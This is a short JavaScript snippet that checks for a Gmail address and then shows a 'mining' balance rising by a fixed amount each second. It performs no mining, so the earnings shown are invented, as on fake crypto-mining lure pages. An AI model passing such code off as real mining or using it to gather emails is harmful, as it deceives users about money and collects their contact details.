let balance = 0;
let interval;

function startMining() {
  const gmail = document.getElementById("gmail").value;
  if (!gmail || !gmail.includes("@gmail.com")) {
    alert("Please enter a valid Gmail address.");
    return;
  }

  document.getElementById("miningBox").style.display = "block";
  balance = 0;

  interval = setInterval(() => {
    balance += 0.000003;
    document.getElementById("amount").innerText = balance.toFixed(8);
  }, 1000);
}
